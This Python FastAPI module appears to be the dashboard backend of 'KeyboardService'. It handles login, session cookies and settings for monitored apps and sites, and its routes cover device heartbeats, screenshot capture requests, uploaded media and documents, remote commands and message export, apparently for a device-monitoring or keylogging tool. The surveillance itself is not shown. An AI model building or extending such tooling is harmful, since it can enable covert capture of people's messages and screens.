import asyncio
import base64
import csv
import gzip
import hashlib
import hmac
import html
import io
import json
import os
import re
import time
import urllib.parse
import urllib.request
import uuid
import zipfile
from urllib.error import HTTPError
from contextlib import asynccontextmanager
from collections import deque
from pathlib import Path
from threading import Lock
from typing import Deque, Dict
from fastapi import FastAPI, Header, Request
from fastapi.responses import FileResponse, JSONResponse, RedirectResponse, Response, StreamingResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
from starlette.datastructures import UploadFile
import psycopg
from PIL import Image, UnidentifiedImageError
from .state import state

def auth_is_enabled() -> bool:
    return bool(state.APP_USERNAME and state.APP_PASSWORD)
state.register('auth_is_enabled', auth_is_enabled)

@state.app.middleware('http')
async def enforce_login_for_dashboard(request: Request, call_next):
    if not state.auth_is_enabled():
        return await call_next(request)
    protected_paths = {'/', '/messages', '/events', '/api/config', '/api/devices', '/api/screenshots', '/api/raw-history', '/api/activity', '/api/export/messages', '/login', '/logout'}
    path = request.url.path
    if path.startswith('/web/'):
        return await call_next(request)
    if path.startswith('/health'):
        return await call_next(request)
    if path.startswith('/api/devices/'):
        if path in {'/api/devices/heartbeat', '/api/devices/screenshot-upload', '/api/devices/screenshot-status', '/api/devices/offline'} or path.startswith(('/api/devices/media/', '/api/devices/documents/', '/api/devices/')) and path.endswith('/screenshot-request') or ('/commands/' in path and path.endswith('/ack')):
            return await call_next(request)
    if path in protected_paths or path.startswith(('/api/config/', '/api/screenshots/', '/api/devices/')):
        token = request.cookies.get('ks_session')
        if not state.validate_session_token(token):
            if path == '/login':
                return await call_next(request)
            return RedirectResponse(url='/login', status_code=302)
    return await call_next(request)
state.register('enforce_login_for_dashboard', enforce_login_for_dashboard)

@state.app.get('/api/config')
async def fetch_config():
    return JSONResponse({'tor_status': {'state': 'not_integrated', 'label': 'not integrated', 'detail': 'The standalone TOR demo is not used by the main client uploads.'}, 'buy_me_a_coffee_url': state.BUY_ME_A_COFFEE_URL if not state.SUPPORT_METHODS else '', 'payment_methods': state.SUPPORT_METHODS, 'monitored_sites': list(state.MONITORED_SITE_PATTERNS), 'monitored_apps': list(state.MONITORED_APP_PATTERNS or state.MONITORED_APP_KEYWORDS)})
state.register('fetch_config', fetch_config)

def load_client_site_url():
    if not state.DATABASE_URL:
        return
    try:
        with psycopg.connect(state.DATABASE_URL) as connection:
            with connection.cursor() as cursor:
                cursor.execute('SELECT setting_value FROM service_settings WHERE setting_key = %s', ('client_site_url',))
                row = cursor.fetchone()
        if row and state.valid_site_url(row[0]):
            state.CLIENT_SITE_URL = row[0].strip().rstrip('/')
    except Exception as error:
        print(f'Could not load client site URL: {error}')
state.register('load_client_site_url', load_client_site_url)

def load_monitored_app_patterns():
    env_value = os.getenv('MONITORED_APP_PATTERNS', os.getenv('MONITORED_APP_LIST', ''))
    if env_value:
        return state.parse_monitored_patterns(env_value)
    if os.path.exists(state.MONITORED_APP_FILE):
        try:
            with open(state.MONITORED_APP_FILE, 'r', encoding='utf-8') as handle:
                payload = json.load(handle)
            if isinstance(payload, dict):
                payload = payload.get('apps', [])
            if isinstance(payload, (list, tuple, set)):
                return state.parse_monitored_patterns(payload)
        except (OSError, ValueError, TypeError):
            pass
    return ()
state.register('load_monitored_app_patterns', load_monitored_app_patterns)

def load_monitored_site_patterns():
    env_value = os.getenv('MONITORED_SITE_PATTERNS', os.getenv('MONITORED_SITE_LIST', ''))
    if env_value:
        return state.parse_monitored_site_patterns(env_value)
    if os.path.exists(state.MONITORED_SITE_FILE):
        try:
            with open(state.MONITORED_SITE_FILE, 'r', encoding='utf-8') as handle:
                payload = json.load(handle)
            if isinstance(payload, dict):
                payload = payload.get('sites', [])
            if isinstance(payload, (list, tuple, set)):
                return state.parse_monitored_site_patterns(payload)
        except (OSError, ValueError, TypeError):
            pass
    return ()
state.register('load_monitored_site_patterns', load_monitored_site_patterns)

@state.app.get('/login')
async def login_page():
    return Response(state.login_page_html(), media_type='text/html')
state.register('login_page', login_page)

def login_page_html(message: str=''):
    message_html = f'<div class="login-error">{html.escape(message)}</div>' if message else ''
    return f'\n    <!DOCTYPE html>\n    <html lang="en">\n    <head>\n      <meta charset="UTF-8" />\n      <meta name="viewport" content="width=device-width, initial-scale=1.0" />\n      <title>KeyboardService Login</title>\n      <style>\n        body {{ font-family: Arial, sans-serif; background: #0b1020; color: #e5eefb; display: grid; place-items: center; min-height: 100vh; margin: 0; }}\n        .card {{ width: min(92vw, 420px); background: #131b2d; border: 1px solid #25314a; border-radius: 12px; padding: 28px; box-shadow: 0 16px 40px rgba(0,0,0,0.35); }}\n        h1 {{ margin-top: 0; font-size: 26px; }}\n        form {{ display: grid; gap: 14px; }}\n        label {{ display: grid; gap: 6px; font-weight: 600; }}\n        input {{ padding: 12px; border-radius: 8px; border: 1px solid #3d4d6f; background: #0d1528; color: white; }}\n        button {{ padding: 12px 16px; border: none; border-radius: 8px; background: #5eb4ff; color: #04111b; font-weight: 700; cursor: pointer; }}\n        .login-error {{ color: #ff958c; background: rgba(255,90,90,0.12); border: 1px solid rgba(255,90,90,0.25); padding: 10px; border-radius: 8px; margin-bottom: 8px; }}\n      </style>\n    </head>\n    <body>\n      <div class="card">\n        <h1>KeyboardService</h1>\n        {message_html}\n        <form method="post" action="/login">\n          <label>\n            Username\n            <input type="text" name="username" autocomplete="username" required />\n          </label>\n          <label>\n            Password\n            <input type="password" name="password" autocomplete="current-password" required />\n          </label>\n          <button type="submit">Log in</button>\n        </form>\n      </div>\n    </body>\n    </html>\n    '
state.register('login_page_html', login_page_html)

@state.app.post('/login')
async def login_submit(request: Request):
    if not state.auth_is_enabled():
        return RedirectResponse(url='/', status_code=302)
    form = await request.form()
    username = str(form.get('username', '')).strip()
    password = str(form.get('password', '')).strip()
    if username == state.APP_USERNAME and password == state.APP_PASSWORD:
        response = RedirectResponse(url='/', status_code=302)
        response.set_cookie(key='ks_session', value=state.make_session_token(username), httponly=True, samesite='lax', max_age=60 * 60 * 12)
        return response
    return Response(state.login_page_html('Invalid username or password.'), media_type='text/html')
state.register('login_submit', login_submit)

@state.app.get('/logout')
async def logout():
    response = RedirectResponse(url='/login', status_code=302)
    response.delete_cookie('ks_session')
    return response
state.register('logout', logout)

def make_session_token(username: str) -> str:
    signature = hmac.new(state.APP_SESSION_SECRET.encode('utf-8'), username.encode('utf-8'), hashlib.sha256).hexdigest()
    return f'{username}:{signature}'
state.register('make_session_token', make_session_token)

def parse_monitored_patterns(raw_value):
    if isinstance(raw_value, (list, tuple, set)):
        items = raw_value
    else:
        items = str(raw_value or '').replace(';', ',').replace('\n', ',').split(',')
    patterns = []
    for item in items:
        candidate = str(item or '').strip().lower()
        if candidate:
            patterns.append(candidate)
    return tuple(dict.fromkeys(patterns))
state.register('parse_monitored_patterns', parse_monitored_patterns)

def parse_monitored_site_patterns(raw_value):
    if isinstance(raw_value, (list, tuple, set)):
        items = raw_value
    else:
        items = str(raw_value or '').replace(';', ',').replace('\n', ',').split(',')
    patterns = []
    for item in items:
        candidate = str(item or '').strip().lower().strip('/')
        if not candidate:
            continue
        parsed = urllib.parse.urlparse(candidate if '//' in candidate else f'https://{candidate}')
        host = (parsed.netloc or parsed.path or candidate).split(':', 1)[0].strip('.')
        if host:
            patterns.append(host)
    return tuple(dict.fromkeys(patterns))
state.register('parse_monitored_site_patterns', parse_monitored_site_patterns)

def parse_support_methods(value):
    if value.startswith(('http://', 'https://')):
        return []
    methods = []
    for entry in value.replace('\n', ';').split(';'):
        if '=' not in entry:
            continue
        name, payment_value = entry.split('=', 1)
        name = name.strip()
        payment_value = payment_value.strip()
        if name and payment_value:
            methods.append({'name': name, 'value': payment_value})
    return methods
state.register('parse_support_methods', parse_support_methods)

def persist_monitored_app_patterns(patterns):
    cleaned = state.parse_monitored_patterns(patterns)
    try:
        with open(state.MONITORED_APP_FILE, 'w', encoding='utf-8') as handle:
            json.dump({'apps': list(cleaned)}, handle, indent=2)
    except OSError:
        pass
    return cleaned
state.register('persist_monitored_app_patterns', persist_monitored_app_patterns)

def persist_monitored_site_patterns(patterns):
    cleaned = state.parse_monitored_site_patterns(patterns)
    try:
        with open(state.MONITORED_SITE_FILE, 'w', encoding='utf-8') as handle:
            json.dump({'sites': list(cleaned)}, handle, indent=2)
    except OSError:
        pass
    return cleaned
state.register('persist_monitored_site_patterns', persist_monitored_site_patterns)

@state.app.get('/')
async def root(request: Request):
    token = request.cookies.get('ks_session')
    if state.auth_is_enabled() and (not state.validate_session_token(token)):
        return RedirectResponse(url='/login', status_code=302)
    return FileResponse(state.HTML_PATH)
state.register('root', root)

def set_client_site_url(value: str):
    state.CLIENT_SITE_URL = value.strip().rstrip('/')
    if not state.DATABASE_URL:
        return
    with psycopg.connect(state.DATABASE_URL) as connection:
        with connection.cursor() as cursor:
            cursor.execute('\n                INSERT INTO service_settings (setting_key, setting_value)\n                VALUES (%s, %s)\n                ON CONFLICT (setting_key) DO UPDATE SET\n                    setting_value = EXCLUDED.setting_value,\n                    updated_at = now()\n                ', ('client_site_url', state.CLIENT_SITE_URL))
state.register('set_client_site_url', set_client_site_url)

def telegram_configured():
    return bool(state.TELEGRAM_BOT_TOKEN and state.TELEGRAM_CHAT_ID)
state.register('telegram_configured', telegram_configured)

@state.app.post('/api/config/monitored-apps')
async def update_monitored_apps(request: Request):
    payload = await request.json()
    apps_value = payload.get('apps') if isinstance(payload, dict) else payload
    if apps_value is None:
        return JSONResponse({'ok': False, 'error': 'apps are required'}, status_code=400)
    apps = state.parse_monitored_patterns(apps_value)
    state.MONITORED_APP_PATTERNS = state.persist_monitored_app_patterns(apps)
    return JSONResponse({'ok': True, 'apps': list(state.MONITORED_APP_PATTERNS)})
state.register('update_monitored_apps', update_monitored_apps)

@state.app.post('/api/config/monitored-sites')
async def update_monitored_sites(request: Request):
    payload = await request.json()
    sites_value = payload.get('sites') if isinstance(payload, dict) else payload
    if sites_value is None:
        return JSONResponse({'ok': False, 'error': 'sites are required'}, status_code=400)
    sites = state.parse_monitored_site_patterns(sites_value)
    state.MONITORED_SITE_PATTERNS = state.persist_monitored_site_patterns(sites)
    return JSONResponse({'ok': True, 'sites': list(state.MONITORED_SITE_PATTERNS)})
state.register('update_monitored_sites', update_monitored_sites)

def valid_site_url(value: str) -> bool:
    parsed = urllib.parse.urlparse(value.strip().rstrip('/'))
    return parsed.scheme in {'http', 'https'} and bool(parsed.netloc)
state.register('valid_site_url', valid_site_url)

def validate_session_token(token: str | None) -> bool:
    if not token or not state.APP_USERNAME or (not state.APP_PASSWORD):
        return False
    try:
        username, signature = token.split(':', 1)
    except ValueError:
        return False
    expected = state.make_session_token(state.APP_USERNAME)
    expected_username, expected_signature = expected.split(':', 1)
    return username == expected_username and hmac.compare_digest(signature, expected_signature) and (username == state.APP_USERNAME)
state.register('validate_session_token', validate_session_token)
